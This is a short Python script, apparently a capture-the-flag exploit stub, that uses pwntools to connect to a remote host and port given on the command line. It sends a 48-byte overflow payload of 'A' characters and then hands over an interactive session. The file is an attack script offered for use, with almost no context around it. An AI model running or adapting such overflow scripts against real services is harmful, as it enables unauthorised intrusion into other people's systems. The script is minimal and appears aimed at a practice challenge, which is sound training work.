#!/usr/bin/env python3

from pwn import *

def exploit(io):
    payload = b'A'*48
    io.sendline(payload)
    io.interactive()

def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
